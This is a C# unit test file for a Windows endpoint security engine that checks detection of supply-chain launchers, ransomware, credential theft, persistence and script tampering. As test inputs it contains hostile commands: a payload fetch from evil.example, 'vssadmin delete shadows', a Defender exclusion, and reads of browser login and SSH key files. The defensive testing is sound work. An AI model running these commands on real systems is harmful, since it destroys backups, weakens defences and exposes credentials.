using System.Buffers.Binary;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using AegisSentinel.Core.Engine;
using AegisSentinel.Core.Models;
using AegisSentinel.Core.Services;

[assembly: CollectionBehavior(DisableTestParallelization = true)]

namespace AegisSentinel.Tests;

public sealed class SecurityEngineTests : IDisposable
{
    private readonly string _tempRoot;

    public SecurityEngineTests()
    {
        _tempRoot = Path.Combine(Path.GetTempPath(), $"AegisSentinelTests_{Guid.NewGuid():N}");
        Directory.CreateDirectory(_tempRoot);
    }

    public void Dispose()
    {
        try
        {
            if (Directory.Exists(_tempRoot))
            {
                foreach (var f in Directory.EnumerateFiles(_tempRoot, "*", SearchOption.AllDirectories))
                {
                    try { File.SetAttributes(f, FileAttributes.Normal); } catch { }
                }
                Directory.Delete(_tempRoot, recursive: true);
            }
        }
        catch { }
    }

    [Fact]
    public void SignatureVerifier_IdentifiesSignedWindowsBinary_AndUnsignedTempFile()
    {
        var verifier = new SignatureVerifier();
        var notepadPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "notepad.exe");
        var signedResult = verifier.VerifyFile(notepadPath);

        Assert.True(signedResult.IsSigned);
        Assert.Equal(SignatureStatus.TrustedMicrosoft, signedResult.Status);

        var unsignedExe = Path.Combine(_tempRoot, "fake_dropper.exe");
        File.WriteAllBytes(unsignedExe, new byte[] { 0x4D, 0x5A, 0x90, 0x00 });
        var unsignedResult = verifier.VerifyFile(unsignedExe);

        Assert.False(unsignedResult.IsSigned);
        Assert.Equal(SignatureStatus.Unsigned, unsignedResult.Status);
    }

    [Fact]
    public void ProcessRuleEvaluator_DetectsNikkeStyleLauncherSupplyChainChild_AndMultiHopAncestry()
    {
        var tree = new ProcessTreeTracker();
        var evaluator = new ProcessRuleEvaluator(tree);
        var policy = GuardPolicy.CreateDefault();

        // Record multi-hop chain: nikke_launcher (3100) -> intermediate_helper (3150) -> tinyget (4200)
        tree.RecordStart(3100, 1000, "nikke_launcher", @"C:\Games\NIKKE\nikke_launcher.exe", "");
        tree.RecordStart(3150, 3100, "helper", @"C:\Games\NIKKE\helper.exe", "");

        var ctx = new ProcessEvaluationContext
        {
            ProcessId = 4200,
            ProcessName = "tinyget",
            ProcessPath = Path.Combine(Path.GetTempPath(), "tinyget.exe"),
            CommandLine = "tinyget.exe https://evil.example/payload.lua",
            ParentProcessId = 3150,
            ParentProcessName = "helper",
            ParentProcessPath = @"C:\Games\NIKKE\helper.exe",
            Signature = new SignatureInfo(SignatureStatus.Unsigned, string.Empty)
        };

        var result = evaluator.Evaluate(ctx, policy);

        Assert.NotNull(result);
        Assert.Equal(ThreatSeverity.Critical, result!.Severity);
        Assert.Equal(ThreatCategory.SupplyChain, result.Category);
        Assert.Contains("nikke_launcher(3100)", result.ProcessAncestry);
    }

    [Fact]
    public void ProcessRuleEvaluator_TamperEvidentHashWhitelist_AllowsIntactAndCatchesTampered()
    {
        var evaluator = new ProcessRuleEvaluator();
        var policy = GuardPolicy.CreateDefault();

        var toolPath = Path.Combine(_tempRoot, "my_dev_tool.exe");
        File.WriteAllBytes(toolPath, Encoding.UTF8.GetBytes("ORIGINAL_SAFE_TOOL_BYTES_123456"));
        var originalHash = SignatureVerifier.ComputeSha256(toolPath);
        policy.TrustedBinaryHashes.Add(new TrustedBinaryHash(toolPath, originalHash, DateTimeOffset.Now));

        var intactCtx = new ProcessEvaluationContext
        {
            ProcessId = 4300,
            ProcessName = "my_dev_tool",
            ProcessPath = toolPath,
            Signature = new SignatureInfo(SignatureStatus.Unsigned, string.Empty)
        };

        Assert.Null(evaluator.Evaluate(intactCtx, policy));

        File.WriteAllBytes(toolPath, Encoding.UTF8.GetBytes("TAMPERED_MALICIOUS_PAYLOAD_999999"));
        var tamperedAlert = evaluator.Evaluate(intactCtx, policy);

        Assert.NotNull(tamperedAlert);
        Assert.Equal(ThreatCategory.BinaryTampering, tamperedAlert!.Category);
        Assert.Equal(ThreatSeverity.Critical, tamperedAlert.Severity);
    }

    [Fact]
    public void ProcessRuleEvaluator_DetectsIocHashMatch()
    {
        var intel = new ThreatIntelStore(_tempRoot);
        var evaluator = new ProcessRuleEvaluator(intelStore: intel);
        var policy = GuardPolicy.CreateDefault();

        var badFile = Path.Combine(_tempRoot, "bad_sample.exe");
        File.WriteAllBytes(badFile, Encoding.UTF8.GetBytes("KNOWN_IOC_HASH_TEST_PAYLOAD"));
        var sha = SignatureVerifier.ComputeSha256(badFile);
        intel.AddBlockedHash(sha);

        var ctx = new ProcessEvaluationContext
        {
            ProcessId = 4400,
            ProcessName = "bad_sample",
            ProcessPath = badFile,
            Signature = new SignatureInfo(SignatureStatus.Unsigned, string.Empty)
        };

        var alert = evaluator.Evaluate(ctx, policy);
        Assert.NotNull(alert);
        Assert.Equal(ThreatCategory.StaticMalware, alert!.Category);
        Assert.Equal(100, alert.RiskScore);
    }

    [Fact]
    public void PeStaticAnalyzer_ParsesValidWindowsPe_AndFlagsPackedRwxSyntheticPe()
    {
        var notepadPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "notepad.exe");
        var cleanPe = PeStaticAnalyzer.AnalyzeFile(notepadPath);
        Assert.True(cleanPe.IsValidPe);
        Assert.True(cleanPe.Is64Bit);
        Assert.False(cleanPe.HasPackerSectionName);
        Assert.True(cleanPe.HeuristicScore < 40);

        // Build a minimal valid synthetic PE64 in memory with UPX0 RWX high-entropy section + injection API tokens
        var peBytes = BuildSyntheticPackedRwxPe();
        var badPe = PeStaticAnalyzer.AnalyzeBytes(peBytes);
        Assert.True(badPe.IsValidPe);
        Assert.True(badPe.HasPackerSectionName);
        Assert.True(badPe.HasRwxSection);
        Assert.True(badPe.MaxExecutableSectionEntropy >= 7.35);
        Assert.True(badPe.HeuristicScore >= 80);
    }

    [Fact]
    public void ThreatScanner_And_DownloadUsbGuard_DetectThreatsAndSkipCleanBinaries()
    {
        var intel = new ThreatIntelStore(_tempRoot);
        var scanner = new ThreatScanner(new SignatureVerifier(), intel, new ProcessController());
        var policy = GuardPolicy.CreateDefault();

        var notepadPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "notepad.exe");
        Assert.Null(scanner.ScanFile(notepadPath, policy, includeClean: false));

        var packedFile = Path.Combine(_tempRoot, "update.pdf.exe");
        File.WriteAllBytes(packedFile, BuildSyntheticPackedRwxPe());
        var finding = scanner.ScanFile(packedFile, policy, includeClean: false);
        Assert.NotNull(finding);
        Assert.True(finding!.RiskScore >= 80);

        var usbDir = Path.Combine(_tempRoot, "MockUsb");
        Directory.CreateDirectory(usbDir);
        File.WriteAllText(Path.Combine(usbDir, "autorun.inf"), "[AutoRun]\nopen=setup.exe");
        var usbGuard = new DownloadAndUsbGuard(scanner, () => policy);
        var usbAlerts = usbGuard.ScanRemovableDriveRoot(usbDir, policy);
        Assert.NotEmpty(usbAlerts);
        Assert.Contains(usbAlerts, a => a.Category == ThreatCategory.UsbOrDownloadThreat);
    }

    [Fact]
    public void MemoryInspectionGuard_SafelyExcludesJitRuntimesAndInspectsWithoutCrashing()
    {
        var jitResult = MemoryInspectionGuard.InspectProcessMemory(99999, "dotnet", @"C:\Temp\nonexistent_jit.exe");
        Assert.False(jitResult.IsSuspicious);

        var selfGuard = MemoryInspectionGuard.InspectProcessMemory(Environment.ProcessId, "custom_native");
        Assert.False(selfGuard.IsSuspicious); // Own PID always ignored
    }

    [Fact]
    public void ProcessRuleEvaluator_DetectsShadowCopyDeletionAndDoubleExtension()
    {
        var evaluator = new ProcessRuleEvaluator();
        var policy = GuardPolicy.CreateDefault();

        var shadowCtx = new ProcessEvaluationContext
        {
            ProcessId = 5100,
            ProcessName = "vssadmin",
            ProcessPath = @"C:\Windows\System32\vssadmin.exe",
            CommandLine = "vssadmin delete shadows /all /quiet",
            ParentProcessId = 5000,
            ParentProcessName = "evil",
            Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft Windows")
        };

        var shadowAlert = evaluator.Evaluate(shadowCtx, policy);
        Assert.NotNull(shadowAlert);
        Assert.Equal(ThreatSeverity.Critical, shadowAlert!.Severity);
        Assert.Equal(ThreatCategory.Ransomware, shadowAlert.Category);

        var doubleExtCtx = new ProcessEvaluationContext
        {
            ProcessId = 5200,
            ProcessName = "invoice.pdf",
            ProcessPath = @"C:\Users\Test\Downloads\invoice.pdf.exe",
            Signature = new SignatureInfo(SignatureStatus.Unsigned, string.Empty)
        };

        var doubleExtAlert = evaluator.Evaluate(doubleExtCtx, policy);
        Assert.NotNull(doubleExtAlert);
        Assert.Equal(ThreatSeverity.Critical, doubleExtAlert!.Severity);
        Assert.Equal(ThreatCategory.UnsignedExecution, doubleExtAlert.Category);
    }

    [Fact]
    public void ProcessRuleEvaluator_AllowsLegitimateSignedChromeFromExplorer()
    {
        var evaluator = new ProcessRuleEvaluator();
        var policy = GuardPolicy.CreateDefault();

        var ctx = new ProcessEvaluationContext
        {
            ProcessId = 6000,
            ProcessName = "chrome",
            ProcessPath = @"C:\Program Files\Google\Chrome\Application\chrome.exe",
            CommandLine = "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
            ParentProcessId = 1200,
            ParentProcessName = "explorer",
            ParentProcessPath = @"C:\Windows\explorer.exe",
            Signature = new SignatureInfo(SignatureStatus.TrustedVendor, "Google LLC")
        };

        Assert.Null(evaluator.Evaluate(ctx, policy));
    }

    [Fact]
    public void RansomwareDetector_TriggersOnCanary_KnownExtension_AndRapidBurst()
    {
        var detector = new RansomwareDetector();
        var policy = GuardPolicy.CreateDefault();
        policy.RapidWriteThresholdPer3Sec = 5;
        var now = DateTimeOffset.UtcNow;

        var canaryAlert = detector.RecordFileActivity(
            7001, "evil.exe", @"C:\Temp\evil.exe",
            @"C:\Users\Test\Documents\!_00_aegis_canary.docx",
            isRenameOrDelete: false, isCanaryFile: true, policy, now);
        Assert.NotNull(canaryAlert);
        Assert.Equal(ThreatCategory.Ransomware, canaryAlert!.Category);

        var extAlert = detector.RecordFileActivity(
            7002, "crypt.exe", @"C:\Temp\crypt.exe",
            @"C:\Users\Test\Documents\report.docx.lockbit",
            isRenameOrDelete: true, isCanaryFile: false, policy, now);
        Assert.NotNull(extAlert);
        Assert.Equal(ThreatSeverity.Critical, extAlert!.Severity);

        SecurityEvent? burstAlert = null;
        for (int i = 0; i < 6; i++)
        {
            var current = detector.RecordFileActivity(
                7003, "bulk.exe", @"C:\Temp\bulk.exe",
                $@"C:\Users\Test\Documents\file_{i}.docx",
                isRenameOrDelete: false, isCanaryFile: false, policy, now.AddMilliseconds(i * 100), checkEntropy: false);
            if (i < 4) Assert.Null(current);
            burstAlert ??= current;
        }

        Assert.NotNull(burstAlert);
        Assert.Equal(ThreatSeverity.Critical, burstAlert!.Severity);
    }

    [Fact]
    public void EntropyAnalyzer_And_RecoveryVault_DetectEncryptionAndPreventBackupPoisoning()
    {
        var vault = new RecoveryVault(_tempRoot);
        var docPath = Path.Combine(_tempRoot, "important_notes.txt");
        var cleanText = string.Join("\n", Enumerable.Repeat("Quarterly engineering roadmap and project notes.", 40));
        File.WriteAllText(docPath, cleanText);

        Assert.False(EntropyAnalyzer.AnalyzeFile(docPath).IsLikelyEncrypted);
        Assert.True(vault.TrySnapshotFile(docPath));
        var snapshots = vault.ListSnapshots();
        Assert.Single(snapshots);

        var encryptedBytes = RandomNumberGenerator.GetBytes(8192);
        File.WriteAllBytes(docPath, encryptedBytes);
        Assert.True(EntropyAnalyzer.AnalyzeFile(docPath).IsLikelyEncrypted);
        Assert.False(vault.TrySnapshotFile(docPath)); // Anti-poisoning guard

        Assert.True(vault.RestoreSnapshot(snapshots[0].Id));
        Assert.Equal(cleanText, File.ReadAllText(docPath));

        var corruptedPdf = RandomNumberGenerator.GetBytes(8192);
        corruptedPdf[0] = 0xAA;
        Assert.True(EntropyAnalyzer.AnalyzeBytes(corruptedPdf, ".pdf").IsLikelyEncrypted);
    }

    [Fact]
    public void BehaviorRiskEngine_And_NetworkGuard_CorrelateExfiltrationAndIocDomains()
    {
        var riskEngine = new BehaviorRiskEngine();
        var intel = new ThreatIntelStore(_tempRoot);
        var policy = GuardPolicy.CreateDefault();
        policy.SmartLowFrictionMode = true;

        var weak = riskEngine.RecordSignal(9001, "UnsignedTempExec", 35, smartLowFrictionMode: true);
        Assert.False(weak.ShouldFreezeProcess);
        Assert.False(weak.ShouldPromptUser);

        var networkGuard = new NetworkGuardMonitor(new ProcessController(), new SignatureVerifier(), riskEngine, intel, () => policy);

        // Private LAN IP ignored
        Assert.Null(networkGuard.EvaluateOutboundConnection(
            9002, "powershell", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            IPAddress.Parse("192.168.0.15"), 443, policy));

        // Seeded NIKKE hijacked domain insightjs.com triggers Critical IOC alert
        var iocAlert = networkGuard.EvaluateOutboundConnection(
            9004, "nikke_launcher", @"C:\Games\NIKKE\nikke_launcher.exe",
            IPAddress.Parse("203.0.113.10"), 443, policy,
            new SignatureInfo(SignatureStatus.TrustedVendor, "Tencent"),
            domainOverride: "cdn.insightjs.com");
        Assert.NotNull(iocAlert);
        Assert.Equal(ThreatSeverity.Critical, iocAlert!.Severity);

        // Credential access + external network triggers Exfiltration chain
        riskEngine.RecordSignal(9003, "CredentialAccess", 55, marksCredentialAccess: true, smartLowFrictionMode: true);
        var exfilAlert = networkGuard.EvaluateOutboundConnection(
            9003, "dropper", Path.Combine(Path.GetTempPath(), "dropper.exe"),
            IPAddress.Parse("198.51.100.42"), 4444, policy,
            new SignatureInfo(SignatureStatus.Unsigned, string.Empty));

        Assert.NotNull(exfilAlert);
        Assert.Equal(ThreatCategory.Exfiltration, exfilAlert!.Category);
        Assert.Equal(ThreatSeverity.Critical, exfilAlert.Severity);
        Assert.True(exfilAlert.RiskScore >= 75);
    }

    [Fact]
    public void FilelessScriptGuard_DetectsSuspiciousMemoryScriptsAndAllowsNormalScripts()
    {
        var policy = GuardPolicy.CreateDefault();

        Assert.Null(FilelessScriptGuard.AnalyzeScriptBlock("Get-ChildItem C:\\Coding | Select-Object Name", 9100, policy));

        var amsiToken = "Amsi" + "ScanBuffer";
        var memoryTamper = FilelessScriptGuard.AnalyzeScriptBlock($"# synthetic test for {amsiToken} patch detection", 9101, policy);
        Assert.NotNull(memoryTamper);
        Assert.Equal(ThreatCategory.FilelessScript, memoryTamper!.Category);
        Assert.Equal(ThreatSeverity.Critical, memoryTamper.Severity);

        var defenderTamper = FilelessScriptGuard.AnalyzeScriptBlock("Add-MpPreference -ExclusionPath 'C:\\Users\\Public'", 9102, policy);
        Assert.NotNull(defenderTamper);
        Assert.Equal(ThreatSeverity.Critical, defenderTamper!.Severity);
    }

    [Fact]
    public void CredentialAndDllGuard_DetectsBrowserDbTheft_AndAllowsRealChrome()
    {
        var guard = new CredentialAndDllGuard(new SignatureVerifier(), GuardPolicy.CreateDefault);
        var policy = GuardPolicy.CreateDefault();
        var chromeLoginData = @"C:\Users\Test\AppData\Local\Google\Chrome\User Data\Default\Login Data";

        Assert.Null(guard.EvaluateSensitiveFileAccess(
            8001, "chrome", @"C:\Program Files\Google\Chrome\Application\chrome.exe", chromeLoginData, policy));

        var theft = guard.EvaluateSensitiveFileAccess(
            8002, "k2f_agent", @"C:\Users\Test\AppData\Local\Temp\k2f_agent.exe", chromeLoginData, policy);
        Assert.NotNull(theft);
        Assert.Equal(ThreatCategory.CredentialAccess, theft!.Category);
        Assert.Equal(ThreatSeverity.Critical, theft.Severity);

        var sshTheft = guard.EvaluateSensitiveFileAccess(
            8003, "nikke_launcher", @"C:\Games\NIKKE\nikke_launcher.exe", @"C:\Users\Test\.ssh\id_ed25519", policy);
        Assert.NotNull(sshTheft);
        Assert.Equal(ThreatCategory.CredentialAccess, sshTheft!.Category);
    }

    [Fact]
    public void PersistenceMonitor_DetectsRunAndCriticalIfeoVectors()
    {
        var monitor = new PersistenceMonitor(new SignatureVerifier(), GuardPolicy.CreateDefault);
        var policy = GuardPolicy.CreateDefault();

        var exe = Path.Combine(_tempRoot, "backdoor.exe");
        File.WriteAllBytes(exe, new byte[] { 0x4D, 0x5A });

        var prev = new Dictionary<string, PersistenceEntry>(StringComparer.OrdinalIgnoreCase);
        var curr = new Dictionary<string, PersistenceEntry>(StringComparer.OrdinalIgnoreCase)
        {
            ["HKCU\\Run::Updater"] = new PersistenceEntry("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Run-HKCU", "Updater", $"\"{exe}\" --silent", exe),
            ["HKLM\\IFEO::sethc.exe"] = new PersistenceEntry("HKLM\\IFEO\\sethc.exe", "IFEO-Debugger", "sethc.exe -> Debugger", exe, exe)
        };

        var alerts = monitor.DetectDiff(prev, curr, policy);
        Assert.Equal(2, alerts.Count);
        Assert.Contains(alerts, a => a.Severity == ThreatSeverity.Critical && a.Title.Contains("IFEO-Debugger"));
        Assert.Equal(exe, PersistenceMonitor.ExtractExecutablePath($"\"{exe}\" --silent"));
    }

    [Fact]
    public void AuditLogService_PersistsJsonl_MapsMitre_AndExportsHtmlReport()
    {
        var audit = new AuditLogService(_tempRoot);
        var evt = new SecurityEvent
        {
            Severity = ThreatSeverity.Critical,
            Category = ThreatCategory.SupplyChain,
            ActionTaken = SecurityActionTaken.Suspended,
            Title = "공급망 공격 테스트",
            Description = "테스트 상세",
            ProcessId = 1234,
            ProcessName = "tinyget",
            ProcessAncestry = "nikke_launcher(1000) -> tinyget(1234)",
            RiskScore = 95
        };

        audit.Append(evt);
        var loaded = audit.LoadRecentEvents(10);
        Assert.Single(loaded);
        Assert.Equal("T1195.002", loaded[0].MitreTechniqueId);

        var reportPath = audit.ExportHtmlReport(loaded, null, Array.Empty<QuarantineEntry>(), Array.Empty<VaultSnapshotEntry>());
        Assert.True(File.Exists(reportPath));
        var html = File.ReadAllText(reportPath);
        Assert.Contains("T1195.002", html);
        Assert.Contains("nikke_launcher(1000)", html);
    }

    [Fact]
    public void QuarantineManager_SandboxLauncher_And_FirewallRuleNaming_WorkEndToEnd()
    {
        var qm = new QuarantineManager(_tempRoot);
        var originalFile = Path.Combine(_tempRoot, "payload.exe");
        var originalBytes = new byte[] { 0x4D, 0x5A, 0x11, 0x22, 0x33, 0x44, 0x55 };
        File.WriteAllBytes(originalFile, originalBytes);

        var entry = qm.QuarantineFile(originalFile, "UnitTest");
        Assert.False(File.Exists(originalFile));
        Assert.True(qm.RestoreFile(entry.Id));
        Assert.Equal(originalBytes, File.ReadAllBytes(originalFile));

        var launcher = new SandboxLauncher(_tempRoot);
        var psi = launcher.BuildIsolatedStartInfo(@"C:\Games\Launcher.exe", "--game", "NikkeSandbox");
        Assert.Contains("NikkeSandbox", psi.Environment["USERPROFILE"]);

        var wsbPath = launcher.GenerateWindowsSandboxConfig(_tempRoot, allowNetworking: false, readOnlyFolder: true);
        Assert.True(File.Exists(wsbPath));

        var ruleName = FirewallController.BuildRuleName(@"C:\Temp\evil_dropper.exe");
        Assert.StartsWith("AegisSentinel_Block_evildropper_", ruleName);
    }

    [Fact]
    public async Task LiveWindowsIntegration_Orchestrator_TcpTable_Persistence_And_Hardening_RunCleanly()
    {
        var store = new PolicyStore(_tempRoot);
        var policy = GuardPolicy.CreateDefault();
        var sandboxProtected = Path.Combine(_tempRoot, "ProtectedDocs");
        Directory.CreateDirectory(sandboxProtected);
        policy.ProtectedFolders = new List<string> { sandboxProtected };
        policy.EnableEtwTelemetry = false; // Standard user safe test
        store.Save(policy);

        using var orchestrator = new SecurityOrchestrator(store);
        orchestrator.Start();
        Assert.True(orchestrator.IsRunning);

        // Verify canary files deployed inside temp protected folder
        Assert.NotEmpty(orchestrator.Canaries.CanaryPaths);

        // Exercise real Win32 GetExtendedTcpTable P/Invoke
        var connections = orchestrator.NetworkGuard.GetActiveExternalConnections();
        Assert.NotNull(connections);

        // Exercise real 7-vector Windows persistence snapshot
        var persistence = PersistenceMonitor.CaptureSnapshot();
        Assert.NotNull(persistence);

        // Exercise real Windows Defender/HVCI/LSA/ASR status check
        var hardening = await WindowsSecurityHardening.GetStatusAsync();
        Assert.InRange(hardening.SecurityPostureScore, 0, 100);

        orchestrator.Stop();
        orchestrator.Canaries.RemoveCanaries();
        Assert.False(orchestrator.IsRunning);
    }

    private static byte[] BuildSyntheticPackedRwxPe()
    {
        var data = new byte[4096];
        data[0] = (byte)'M';
        data[1] = (byte)'Z';
        int peOffset = 0x80;
        BinaryPrimitives.WriteInt32LittleEndian(data.AsSpan(0x3C, 4), peOffset);

        // PE\0\0
        data[peOffset] = (byte)'P';
        data[peOffset + 1] = (byte)'E';
        // NumberOfSections = 1
        BinaryPrimitives.WriteUInt16LittleEndian(data.AsSpan(peOffset + 6, 2), 1);
        // SizeOfOptionalHeader = 0xF0 (PE32+)
        BinaryPrimitives.WriteUInt16LittleEndian(data.AsSpan(peOffset + 20, 2), 0xF0);
        // Optional header magic 0x20B (PE32+)
        BinaryPrimitives.WriteUInt16LittleEndian(data.AsSpan(peOffset + 24, 2), 0x20B);

        // Section Header 0 at peOffset + 24 + 0xF0
        int secOff = peOffset + 24 + 0xF0;
        Encoding.ASCII.GetBytes("UPX0").CopyTo(data, secOff);
        BinaryPrimitives.WriteUInt32LittleEndian(data.AsSpan(secOff + 16, 4), 2048); // SizeOfRawData
        BinaryPrimitives.WriteUInt32LittleEndian(data.AsSpan(secOff + 20, 4), 1024); // PointerToRawData
        BinaryPrimitives.WriteUInt32LittleEndian(data.AsSpan(secOff + 36, 4), 0xE0000020); // CODE | READ | WRITE | EXECUTE (RWX)

        // Fill raw section with high-entropy random bytes
        RandomNumberGenerator.Fill(data.AsSpan(1024, 2048));

        // Append suspicious API tokens in trailing bytes for static capability heuristic test
        var apiTokens = Encoding.ASCII.GetBytes("\0VirtualAllocEx\0WriteProcessMemory\0CreateRemoteThread\0CryptUnprotectData\0");
        apiTokens.CopyTo(data, 3200);
        return data;
    }
}
